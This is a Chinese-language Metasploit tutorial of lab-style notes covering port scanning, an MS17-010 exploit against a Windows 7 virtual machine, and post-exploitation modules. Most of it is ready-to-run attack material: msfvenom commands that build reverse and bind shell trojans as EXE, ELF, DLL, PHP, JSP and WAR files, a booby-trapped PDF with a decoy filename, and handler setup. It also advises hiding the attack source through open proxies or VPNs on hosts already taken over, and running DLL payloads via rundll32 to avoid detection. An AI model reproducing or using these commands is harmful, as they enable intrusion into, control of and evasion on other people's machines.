端⼝扫描
ACK 通过ACK扫描的方式对防火墙上未屏蔽的端口进行探测 
ACK防⽕墙扫描 auxiliary/scanner/portscan/ack 
ftpbounce 通过FTPbounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器 软件能够很好的
防范FTPbounce攻击，但在一些旧的Solaris及FreeBSD系统的FTP服务中 此类工具方法仍能够被利
用 
FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce 
syn 使用发送TCP SYN标志的方式探测开放的端口 
SYN端⼝扫描 auxiliary/scanner/portscan/syn 
tcp 通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确， 但扫描速度较慢 
TCP端⼝扫描 auxiliary/scanner/portscan/tcp 
xmas 一种更为隐秘的扫描方式，通过发送FIN,PSH,和URG标志，能够躲避 一些高级的TCP标记检
测器的过滤
TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas
TCP端⼝扫描：auxiliary/scanner/portscan/tcp
扫描结束 192.168.1.14的开放端口
ACK防⽕墙扫描：auxiliary/scanner/portscan/ack
⽤ACK扫描会分段去发送数据包扫描，才能够绕过⼀些防火墙设备，⽽不是 Windows防火墙！
Windows⾃带的防火墙是阻断⼀切进入的连接! 因为虚拟机Windwos 7是吧防火墙关闭了的，如果打开
那么防火墙是会阻断 连接的！ 经过测试，Windows防火墙开启，使⽤ACK是扫描不出来的！
FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce 
这个因为环境情况 就没有演示
详细可参考：https://blog.csdn.net/asdushf/article/details/111691756
SYN端⼝扫描 auxiliary/scanner/portscan/syn
TCP 端口扫描是通过SYN数据包进行的，用于扫描目标机器的端口上是否存在程序监听，通常意义上，
普通个人机器上的某个端口如果有程序监听的话，那么它一般是 系统漏洞。由于TCP是一个有连接的可
靠协议，所以要使用 三次握手来建立连接， 三次握手的 报文分别是(SYN)、(ACK SYN)和(ACK)。进行 端
口扫描时，首先向对方主机的某一端口发送(SYN) 报文，如果对方这一端口上有程序在监听（或者说存
在漏洞），则回复(SYN ACK) 报文，否则回复(RST)报文。据此就可以判断对方端口上是否有程序在监听
了，或者是否存在漏洞了。
参考：https://blog.51cto.com/ksyiwen/1336392
TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas
常见的网络服务扫描
1.Telnet服务扫描
代码清单3-19中的扫描结果显示，IP地址为10.10.10.254的主机（即网关服务器）开放了Telnet服务，
通过返回的服务旗标“Ubuntu 8.041x0ametasploitable login : ”，可以进一步确认出这台主机的操作系
统版本为Ubuntu 8.04，而主机名为metasploitable。
2.SSH服务扫描
如代码清单3-20所示，使用Metasploit中的ssh_version辅助模块，很快在网络中定位了两台开放SSH服
务的主机，分别是10.10.10.129(网站服务器）和10.10.10.254（网关服务器)，并且显示了SSH服务软件
及具体版本号。
3.Oracle数据库服务查点
4.开放代理探测与利用
在一些特殊情形的渗透测试工作中，为避免被对方的入侵检测系统跟踪，你很有可能需要隐藏自己的身
份。隐藏网络身份的技术很多，比如使用代理服务器(Proxy)、VPN等，不过最简单和最常见的还是使用
代理服务器。
Metasploit提供了open_proxy模块，能够让你更加方便地获取免费的HTTP代理服务器地址。获取免费
开放代理之后，就可以在浏览器或者一些支持配置代理的渗透软件中配置代理，这可以在进行渗透测试
时隐藏你的真实I地址。其使用方法如代码清单3-22所示。
当然，也可以从互联网上搜索一些开放的HTTP、Socks等代理服务器，然后通过代理猎手等专用工具进
行验证，并在进行隐蔽性渗透测试的场景中进行使用。比开放代理更保险的隐藏攻击源方法是利用开放
的或者自主架设的VPN服务，可以从公开渠道搜集到一些免费的VPN服务，也可以自己在已控制的主机
上架设OpenVPN服务。使用这些VPN可以采用加密方式转发路由你的渗透测试数据包，而无需担心你的
攻击发起源被跟踪到。
版本扫描
探测对方操作系统信息：use auxiliary/scanner/smb/smb_version
可以看到，操作系统是Windows 7,主机名是:FUZHONG,在GOD域内
扫描永恒之蓝ms17010 ：use auxiliary/scanner/smb/smb_ms17_010
Host is likely VULNERABLE to MS17-010! 说明是存在永恒之蓝
利用：
可以先用search 搜索一下17010的漏洞利用模块
这里就随便选一个来利用了
就设置了ip  其他参数默认 然后攻击
尴尬 这里好像失败了  原来是360没关   
之后重新测试
小tips：这里是set rhosts 是可以设置多个的  可以同时测试多个目标
五、msf之Exploits模块常用演示
1、显示所有渗透攻击模块
show exploits
2、查找关于smb的攻击模块
search name:smb type:exploit
3、查找路径含有smb的模块
search path:smb
用ms17010演示：exploit/windows/smb/ms17_010_psexec 
可以看到弹回一个会话
其他 Exploit模块的操作也是如此 就不演示了
六、msf之Payloads模块常用演示
Payloads分类
1、singles：独立载荷，可直接植入目标系统并执行相应的程序，如：shell_bind_tcp这个payload。
2、stagers：传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。通
常该种载荷体积都非常小，可以在漏洞利用后方便注入，这类载荷功能都非常相似，大致分为bind型和
reverse型，bind型是需要攻击机主动连接目标端口的；而reverse型是目标机会反连接攻击机，需要提
前设定好连接攻击机的ip地址和端口号。
3、stages：传输体载荷，如shell，meterpreter等。在stagers建立好稳定的连接后，攻击机将stages
传输给目标机，由stagers进行相应处理，将控制权转交给stages。比如得到目标机的shell，或者
meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。
显示所有可用payloads
Metasploit 生成的 Payload分为正向和反向
最常见的payload
windows/meterpreter/bind_tcp    #正向连接
windows/meterpreter/reverse_tcp  #反向连接，常用
windows/meterpreter/reverse_http  #通过监听80端口反向连接
windows/meterpreter/reverse_https #通过监听443端口反向连接
反向payload
反向就是说目标执⾏了我们⽣成的Payload后，会主动连接我们的攻击服务 器MSF
生成木马命令： msfvenom
msfvenom详细语法
-e, –encoder [encoder] 指定需要使用的encoder（编码器） 
-a, –arch  指定payload的目标架构 
–platform  指定payload的目标平台 
-s, –space  设定有效攻击荷载的最大长度 
-b, –bad-chars  设定规避字符集，比如: & #039;\x00\xff& #039; 
-i, –iterations  指定payload的编码次数 
-c, –add-code  指定一个附加的win32 shellcode文件 
-x, –template  指定一个自定义的可执行文件作为模板 
-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行 
–payload-options 列举payload的标准选项 
-o, –out  保存payload 
-v, –var-name  指定一个自定义的变量，以确定输出格式 
–shellest 最小化生成payload 
-h, –help 查看帮助选项 
–help-formats 查看msf支持的输出格式列表
生成木马语句
二进制
linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
windows:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
web 
php:msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php cat 
shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php
asp:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
jap:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
war:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
脚本
python:msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
bash:msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
perl:msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
基于pdf的shellcode 
use exploit/windows/fileformat/adobe_utilprintf 
msf5 exploit(adobe_utilprintf)>set FILENAME BestComputers-UpgradeInstructions.pdfset
PAYLOAD windows/meterpreter/reverse_tcp 
其他的就自己填就好了
LHOST 填写的是攻击机器，也就是Kali的IP LPORT 填写的是端口，一般填写的是高端口，如：
6666、4444、8977等等，但是 最好填写一下比较常用的端口，如：80、443、8080等等
生成shell.exe： msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 
LPORT=5555 -f exe > shell2.exe
此时在当前⽬录下有⼀个shell2.exe! 因为在前面说了，这是反向连接，那么就需要先在攻击机器上监
听，然 后再然后⾁鸡运⾏我们的文件才可以连接！
监听模块： use exploit/multi/handler
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp //这个就是和上面msfvenom使用 的payload是一样
的 
set LHOST 192.168.1.10
set LPORT 5555
run
接着我们放到Windows7下去执⾏这个⼆进制文件：
最后，来看看Metasploit这边的监听情况：
可以看到，Windows7运⾏了刚刚msfvenom⽣成的shell.exe后， Metasploit这边反弹了⼀个
meterpreter会话过来！
这个就是这么⼀个Windows的反向cmdshell 因为刚刚我们所反弹回来了⼀个shell，假设我们要重新监
听其他的 payload，那么就可以使⽤background来返回msfconsole控制台窗⼝：
如果想查看当前连接的session，就可以使⽤sessions查看在后台有哪些连接 了MSF：
如果想进入刚才那个meterperter，那么就sessions后⾯跟他的⼀个id：
这样就进入了刚刚那个cmdshell⾥！
正向payload
使⽤场景 
场景还是得具体看，⽐如⽬标机器不给其他除特定端⼝外的端⼝出站，那就 只能能正向；还有⽐如
有⼀种情 况，⽬标处于深层⽹络，不能直接连通外⽹，也不能通过其他机器连通，因 为其他机器
防⽕墙都开着，为避免 在有防⽕墙监控的情况下关闭防⽕墙⽽被发现，也只能⽤正向的⻢，然后通 
过开着防⽕墙的机器来进⾏端⼝的 转发达到穿透的⽬的
msfvenom⽣成正向Paylaod
msfvenom -p windows/meterpreter/bind_tcp LPORT= -f exe >/root/bind_xx.exe
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT= -f exe >/root/bind_xx.exe 
msfvenom -p windows/meterpreter/bind_tcp LPORT= -f dll >/root/bind_xx.dll 
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT= -f dll >/root/bind_xx.dll 
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT= -f elf >/root/bind_xx.elf 
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT= -f elf >/root/bind_xx.elf
因为我win7虚拟机是x64位系统，我就⽤这条命令：
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=5555 -f exe >bind.exe
在虚拟机上运⾏：bind.exe:
可以看到，已经开放了5555端⼝！
接下来打开msfconsole对虚拟机进⾏连接(前提是对⽅防火墙是关闭了的)：
其中LPORT需要设置为刚刚我们⽣成的Payload⼀样的端⼝，也就是5555: 还要设置⼀个RHOST，也就
是⾁鸡Win7的IP:192.168.1.14 
最后直接运⾏exoloit
这个时候就反弹回来了⼀个Meterpreter会话回来！
同时，⾁鸡win7那边就没有对5555端⼝进⾏连接了！
因为⽤了5555端⼝启⽤监听后，只会接收⼀次数据，⽆论成功或者失败，它 都不会再监听了！ 也就是
说，如果连接失败了，那么就再运⾏然后再连接⼀次！
这是Metasploit⽣成正向的过程！
尽量不要⽣成exe
在真实环境中，如果使⽤msfvenom⽣成了⼀个正向Paylaod格式是exe，那 么在进程中就会暴露！
⼀般⽤就⽤dll！ 
要运⾏dll必须使⽤rundll32.exe来start: 
rundll32.exe文件在C:\Windows\System32\rundll32.exe:
使用方法就是 rundll32.exe xxx.dll,Start
生成一个dll
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f dll >bind.dll 
⽽Meterpreter这边也是反弹了⼀个shell回来
这就是正向连接
七、msf之Post模块常用演示
后渗透操作
在获取到一枚Meterpreter的shell之后，就可以进行下一步的渗透，
那msf中的post模块就是⼀个后渗透模块，⾥⾯包含各种后渗透中有可能⽤到的功能，最多的就 是信息
收集。
search post
这边就模拟⼀下拿到cmdshell后的操作：
可以看到，我这边sessions是有⼀个meterpreter会话：
在后渗透的时候，我们可以使⽤post模块辅助我们
1、获取目标分区情况
run post/windows/gather/forensics/enum_drives
2、检测是否是虚拟主机
run post/windows/gather/checkvm
3、获取当前安装的应用程序
run post/windows/gather/enum_applications
4、获取用户登录信息
run post/windows/gather/enum_logged_on_users
5、收集系统环境信息